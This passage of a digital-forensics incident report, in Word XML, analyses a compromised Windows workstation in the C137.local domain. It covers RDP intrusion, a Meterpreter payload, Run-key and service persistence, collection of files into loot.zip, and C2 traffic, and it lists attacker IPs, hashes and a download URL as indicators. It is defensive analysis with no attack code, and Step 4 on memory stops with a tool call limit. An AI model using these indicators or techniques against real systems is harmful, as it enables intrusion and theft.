        <w:t>Decode the HKLM\Software\q9Z1bssi\JqxNhWJA payload to confirm stager parameters (LHOST/LPORT).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hunt across all hosts for SHA256 10f3b920..., the Run value 'coreupdate', service 'coreupdater', and connections to 194.61.24.102 / 203.78.103.109.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Review \\CITADEL-DC01\FileShare access logs for activity under ricksanchez after 05:08 (Meterpreter Domain Admin context).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Obtain perimeter/firewall/proxy logs beyond the pcap window to bound exfiltration volume and any further C2 sessions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Parse legacy Edge WebCache/spartan.edb for complete browsing history of C137\Administrator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix A: Summary of the analysis steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1: System context and scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Host DESKTOP-SDN1RPT (setup name WIN-2IH1TBB9I4Q), Windows 10 Enterprise Evaluation build 19041 x64, VMware VM, installed 2020-09-18 05:47:03 UTC, TZ Pacific (ActiveTimeBias 420, UTC-7). Joined to domain C137.local at ~21:42 UTC 2020-09-18; static IP 10.42.85.115, DNS/DC 10.42.85.10. Accounts: local Admin (RID 1001, Administrators), domain users ricksanchez (-1106), mortysmith (-1108), domain Administrator (-500, RDP logon type 10 from 10.42.85.10 at 2020-09-19 03:36:24 — to be investigated). Last boot 2020-09-19 01:24:04. Responder acquisition from 05:08:58 (SanDisk USB "Incident_drive" E:, FTK Imager 4.2.1.4 at 05:09:56, memory image SystemTime 05:10:39); pcap covers 2020-09-18 21:58 → 2020-09-19 05:38. Early lead: HKLM Run "coreupdate" (hidden PowerShell executing base64 from HKLM\Software\q9Z1bssi\JqxNhWJA, written 03:44:03) that fired at 05:08:37 — not collection. Findings F-001..F-005 (system description, collection context, telemetry limitations, 4616 clock changes, empty parser outputs) and timeline T-001..T-003 recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No Sysmon; 4688 only at boot; PowerShell logs only cover 05:08; browser history, PSReadLine, RecycleBin, NTUSER ShellBags outputs empty; ODL strings obfuscated; no native_panther/native_wifi tables available (Panther setup logs and Wi-Fi profiles not checked); EMDMgmt not checked (no removable volume other than the responder USB).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2: Triage of automatic detections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Triage of Hayabusa/Chainsaw/Zircolite/Suricata detections. True positives: F-006 RDP type 10 logon of C137\Administrator (SID -500) from DC 10.42.85.10, 03:36:24-03:52:13; F-007 Defender RTP/MAPS/sample submission disabled 03:39:45-03:39:49 (5001/5007 + DisableRealtimeMonitoring=1); F-008 coreupdater.exe (SHA256 10f3b920..., SHA1 fd153c66...) downloaded via Edge from 194.61.24.102 03:39:57, moved to System32, executed 03:40:49 (Prefetch, psscan PID 8324), service 'coreupdater' 7045 03:42:42, C2 203.78.103.109:443 (Suricata Metasploit Bind_API, netscan ESTABLISHED); F-009 getsystem service 'nehgye' 03:43:14 (7045 + CMD prefetch); F-010 Run key 'coreupdate' fired 05:08:37-05:08:44, hidden PowerShell reflective shellcode loader from HKLM\Software\q9Z1bssi (4104/600, prefetch, psscan PID 508-&gt;3316, new C2 flow); F-011 network context: 194.61.24.102 RDP to DC and DC fetched coreupdater, pcap clock ≈ host UTC −1 h (validated on 3 pivots). 7 IOCs, 7 timeline events. FPs documented in note (VMware drivers, FTK ad_driver.sys, OOBE/domain-join account events, SCM WMI consumer, MSIX).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: hashset empty, so no hash matching possible. No Sysmon/4688 to see parent of coreupdater (PPID 4008 not in memory) or what process migrated the Meterpreter session; netscan Owner/PID empty for C2 connections. Defender quarantine/exclusions tables absent. DC-side activity only visible via pcap. PowerShell payload of 05:08:44 (gzip base64) not decoded in this step; malfind/memory injection to be reviewed later.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3: Program execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Reviewed Prefetch (196 entries), Amcache files, ShimCache, BAM, UserAssist, PCA (registry_complement), MUICache, SRUM (app resource, network), LNK/JumpLists/RecentDocs, memory psscan/cmdline. Only malicious binary: C:\Windows\System32\coreupdater.exe (SHA1 fd153c66...), executed once at 03:40:49 by C137\Administrator (SID -500) from Explorer in RDP session 3 (UserAssist, Prefetch, Amcache, PCA 03:43:12, SRUM, psscan PID 8324 exit 03:43:10). Interactive cmd.exe 03:41:06 and sc.exe 03:42:42 (service creation) attributed to the same session (F-012). New: collection of mortysmith's sensitive files via Notepad/Photos 03:45:34-03:47:39 and staging as loot.zip (03:46:18, deleted 03:47:09) (F-013). SRUM shows coreupdater network usage in 04:14 and 05:14 slots (333KB/222KB, 170KB/26KB) and PowerShell (ricksanchez) 178KB at 05:14 (F-014). Benign executions documented in note. Timeline T-011..T-013, IOC loot.zip.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No 4688/Sysmon process-creation telemetry: exact command lines of cmd.exe/sc.exe are unknown (conhost history empty in memory). ShimCache predates attack (last flush at shutdown before 01:24). Exfiltration of loot.zip not proven — to correlate with pcap/Suricata (note ~1h clock skew) and memory in later steps. SRUM coreupdater activity after the 03:43 process exit is unexplained (service instance vs injection) — for memory step.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4: Memory (RAM)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(call limit reached)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: tool call limit reached</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5: Network traffic (PCAP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Analysed case001.pcap (SHA256 09ABF49E..., window 2020-09-18 21:58:07 → 2020-09-19 05:38:57 pcap-UTC, pcap ≈1 h behind host clock, re-validated via RDP flow vs 4624 and C2 flow vs Prefetch). Alerts qualified: the true positives are RDP nmap scan + 198 Administrator RDP login requests from 194.61.24.102 to the DC, coreupdater.exe HTTP downloads (DC 02:24:06, workstation 02:39:58 pcap), and 'PE over raw TCP' + Metasploit Bind_API on 5 sessions to 203.78.103.109:443 (3 DC, 2 workstation); the rest is ET INFO/USER_AGENTS noise. F-017: network object hashes (MD5 eed41b45..., SHA1 fd153c66..., SHA256 10f3b920...) match Amcache; C2 flows 50875 (02:40:49→end, 280 KB up/1.76 MB down) and 50972 (04:08:45→end) match Prefetch/Run-key timings and memory netscan ESTABLISHED sockets. F-018: full RDP chain 194.61.24.102 → DC → DESKTOP-SDN1RPT (flows 02:35:55-02:52:14 pcap = 4624 type 10 session). F-011 complemented with disk/memory refs. No DNS for attacker IPs, no lateral movement from the workstation, no cleartext exfiltration; 10.90.90.90 DNSBL sinkhole is environment. Timeline T-014..T-016, IOCs MD5 + URL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: C2 traffic is encrypted/non-standard ('failed' app_proto): content and any exfiltration of loot.zip (≈280 KB upstream in session #1) cannot be verified. Memory netscan rows for the C2 sockets lack PID/owner (owner attribution relies on F-015/F-016 netstat). DC-side logs not collected, so the success of the RDP brute force is inferred. F-011 remains 'probable' per tool re-assessment despite added disk/memory references.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 6: Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I found two attacker persistence mechanisms, both set up during the C137\Administrator RDP session.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) F-019, fileless: HKLM Run value "coreupdate", written 03:44:03 UTC. It starts a hidden PowerShell that runs base64 code stored in HKLM\Software\q9Z1bssi\JqxNhWJA, which matches the Metasploit registry_persistence template. It fired at ricksanchez's logon at 05:08:37 (Shell-Core 9707/9708, PowerShell 600/400), so the attacker gained a Domain Admin context.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(2) F-020: auto-start LocalSystem service "coreupdater" (C:\Windows\System32\coreupdater.exe), sources 7045 03:42:42 + SYSTEM hive + memory svclist (STOPPED). It has never fired because the last boot (01:24) came before the install. "nehgye" was a temporary getsystem service, already deleted, and is not persistence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ruled out as benign: scheduled tasks (TaskCache, TaskScheduler 106/140/141, memory), HKCU Run/RunOnce (OneDrive), AppInit_DLLs (empty), Active Setup, Print Monitors/Processors, BootExecute/SetupExecute, WMI 5861 (built-in SCM filter), hosts file (unchanged), Startup folders, and services written after boot (RDP, USB, FTK).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Recorded: T-017, IOCs I-011 (Run value) and I-012 (service), plus a note listing the ruled-out items.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - The payload data in HKLM\Software\q9Z1bssi\JqxNhWJA was not extracted by any parser, so the stage content cannot be decoded here.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The dissect_tasks, dissect_clsid_user, dissect_cim_consumerbindings, native_startup, native_hosts and dissect_msoffice_startup tables are missing. COM hijacking, the WMI repository and Office startup could only be checked indirectly (5861, MFT).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Security auditing for 4697/4698/4702 was not enabled.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- PendingFileRenameOperations was not parsed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Winlogon Shell/Userinit and IFEO were checked only through the RECmd Kroll rows; no anomalous value showed up.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7: Accounts, authentication and privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I reviewed the Security events (4624/4625/4634/4647/4648/4672/4720/4722/4724/4728/4732/4738/4798/4799), TerminalServices LSM 21-25/39/40, RCM 261/1149, the SAM UserAccounts, the Terminal Server registry values and the memory token SIDs (getsids).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>F-021 (context):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- All account creations happened during OOBE: WDAGUtilityAccount, defaultuser0 and the local Admin (RID 1001).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The domain join at 21:42:15 used explicit C137\Administrator credentials (4648) and added Domain Admins to the local Administrators group.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- There was only one 4625, and it came from clock skew. There was no brute force against the workstation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- I summarised logons per account: Admin local console until 03:17:00; ricksanchez and mortysmith type 2 on 2020-09-18 22:44-22:59; ricksanchez type 11/7 at 05:08:15; C137\Administrator type 3 Kerberos and type 10 from 10.42.85.10, 03:36:22-03:52:13.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>F-022 (medium):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 22:55:33, ricksanchez (from his console session, LogonId 0x438E75) added -500, Domain Admins, Domain Users and mortysmith to Remote Desktop Users. This is probably admin configuration done before the incident, but it authorised the attacker's RDP path.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- fDenyTSConnections=0. The key's LastWrite (03:17:00) matches the end of the local Admin session.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>F-023 (high, EVTX + memory):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The attacker's session (LogonId 0x857E73) had SeDebug, SeLoadDriver and similar privileges. The coreupdater/Edge tokens contain Domain Admins (-512) and Enterprise Admins (-519), so no local privilege escalation was needed beyond getsystem.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ricksanchez (Domain Admin per memory) made a cached type 11 logon at 05:08:15 at the start of the responder's acquisition. That logon set off the HKLM Run loader in a Domain Admin context.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I added timeline events T-018 (logoff 03:52:13) and T-019 (RDU change), and IOC I-013 (the compromised C137\Administrator account).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: There are no DC logs, so Kerberos 4768/4769/4776 for the stolen Administrator credential and the brute-force origin cannot be seen on the DC side. No RDPClient 1024/1102 events were found for outbound RDP from this host, which fits the absence of lateral movement from the workstation. I could not tell which value under the Terminal Server key was written at 03:17:00: the key timestamp only covers the last write.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 8: Remote access and lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Remote access and lateral movement review:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Inbound RDP: the only remote interactive session is C137\Administrator from DC 10.42.85.10 (already covered in F-006/F-018; RCM 1149 and RdpCoreTS 168 at 03:36:23; eve_rdp).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Outbound RDP: no Terminal Server Client keys, no MSTSC Prefetch, no .rdp files, and no flows from the workstation to any host on port 3389.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PsExec: none. 7045 shows only coreupdater, nehgye, WPD and FTK besides OOBE/VMware. There is no PSEXESVC, and PsExec, PAExec and RemCom are absent from $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- WinRM: only local SYSTEM client-side Enumeration events that failed with 0x80338012 at boot/logon. There were no server-side WinRM sessions.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- RMM tools: no AnyDesk, TeamViewer, ScreenConnect, RustDesk, Splashtop, VNC, ngrok or chisel artifacts in $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Prefetch for net, wmic or winrs.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Network: internally the workstation only talks to the DC (DNS, Kerberos, LDAP, RPC, SMB for SYSVOL/GPO and NETLOGON at the attacker's profile load). Memory netscan shows only the 3389/445 listeners plus one SMB session to the DC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>F-024 (info): the host was an RDP target, not a pivot.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>F-025 (medium): ricksanchez's persistent Z: drive (\\CITADEL-DC01\FileShare, mapped 22:45 the day before) reconnected at the 05:08 logon. That is the same Domain Admin context in which the Meterpreter loader runs. The SMB session was about 28 KB, so there is no sign of bulk transfer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - File-share auditing (5140/5145) and Sysmon were not available.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- C2 traffic is encrypted, so I cannot rule out pivoting or port forwarding through Meterpreter.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The raw.dissect_mru_mstsc, native_rdp, dissect_remoteaccess_* and dissect_mru_networkdrive tables are absent from this database. I used registry_kroll instead.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No RDP bitmap cache was parsed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 9: User activity on files and folders</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I reviewed LNK (31), Jump Lists auto/custom, ShellBags (4 UsrClass hives), RecentDocs, OpenSave/LastVisited MRU, TypedURLs/TypedPaths, Windows Timeline (Administrator ActivitiesCache incl. CopyPaste), SIDR activity, $UsnJrnl/$MFT for the 03:36-05:20 window, USB/USBSTOR, and memory filescan/cmdscan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>New findings:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- F-026 (high, confirmed): the attacker browsed the Admin, mortysmith and ricksanchez profiles (ShellBags 03:45:07-03:51:14) and opened the SSN, Plans, Portal_gun and Thoughts files. The Explorer zip "My Social Security Number.zip" was created at 03:46:15 (MFT 87470-2), renamed loot.zip at 03:46:18, and permanently deleted at 03:47:09 without going through the Recycle Bin. Its MFT entry was reused by Thoughts.lnk at 03:47:39.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- F-027 (high, confirmed): GUI workflow for the payload. Edge directory listing of 194.61.24.102 (03:39:29-03:44:52), SecHealthUI 03:39:38-54 (also added to F-007), Save-As via PickerHost into Downloads (03:40:00), Explorer move to System32 (03:40:42, same MFT entry), and clipboard pastes into cmd.exe at 03:41:21 and 03:42:38/41/44 around the sc.exe service creation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- F-028 (info): the only USB device is the responder's SanDisk E: (VSN A6125E71), browsed 05:09-05:13 under ricksanchez. No attacker removable or network volumes appear in LNK, jump lists or ShellBags.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Timeline T-020..T-022 and IOC I-014 were added. Noise is documented in a note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - The loot.zip content and hash cannot be recovered: the MFT record was reused and no memory object exists.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Exfiltration of the archive over RDP or the encrypted C2 channel is not provable from the artifacts.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The commands pasted into cmd.exe were not recovered (clipboard payloads empty, no console history).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Thumbcache, Notepad tabs, Recycle Bin and Dissect MRU tables are not available in the database.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- ShellBag/LNK coverage depends on Explorer usage. Actions performed through Meterpreter leave no ShellBag or LNK artifacts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 10: Web browsing, downloads and e-mail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Step 10 (web browsing, downloads and e-mail) is done. No browser-history tables were parsed: there is no Chromium, Firefox, Hindsight or IE/WebCache output, and the legacy Edge spartan.edb/WebCache files were not processed. I rebuilt the web activity from the Windows Timeline, SIDR activity history, Suricata HTTP/TLS/fileinfo, $UsnJrnl, $MFT Zone.Identifier ADS (disk and memory vol_ads), OpenSavePidlMRU and TypedURLs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>New finding F-029 (high, confirmed: pcap + disk + Windows Timeline) traces where coreupdater.exe came from:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C137\Administrator opened legacy Edge (EdgeHTML 18.19041, first run for this profile) and went straight to http://194.61.24.102/, a 228-byte directory listing. The request had no Referer, so the URL was typed or pasted.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge then fetched /coreupdater.exe (SHA256 10f3b920…, 7168 bytes) with that page as Referer.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Disk trace of the download: cache copy coreupdater[1].exe at 03:39:57; Save-As as Downloads\coreupdater.exe.b1jhvkh.partial (MFT 26213) with the Zone.Identifier ADS written at 03:40:00.864, then renamed to coreupdater.exe; moved to System32 at 03:40:42.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Zone.Identifier stream was removed (USN StreamChange) at 03:40:49.317. That is the moment the file ran, and it matches the SmartScreen checkappexec TLS connection in the capture. The most likely explanation is that the user clicked through the SmartScreen/security warning; a manual unblock is the less likely alternative. The ADS is absent from $MFT at acquisition.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The attacker server delivered only two objects to this host: the "/" listing and coreupdater.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Also recorded: timeline event T-023 and IOC I-015 (http://194.61.24.102/). The noise note covers:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- mortysmith's benign Bing image browsing on 2020-09-18 around 23:00, which produced Jessica.jpg and Portal_gun.png (Portal_gun.png was later taken by the attacker).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge backup MOTW files.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- autorunsc entries found in memory that reference a "James" profile, which has no matching $MFT entry and is not attacker activity.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No e-mail stores exist on the host, so e-mail as the delivery route is ruled out.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - No browser history databases were parsed (legacy Edge WebCacheV01.dat / spartan.edb, Chromium Edge, if present), so I could not check full URL history, typed search terms or the download list. Parsing them with ESEDatabaseView, Hindsight or dissect would close this gap.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The HostUrl/ReferrerUrl of coreupdater.exe can't be recovered: the Zone.Identifier stream was removed and its text is not in the parsed $LogFile output.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Bing searches are TLS-encrypted, so intent queries (if any) can't be seen in the capture.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
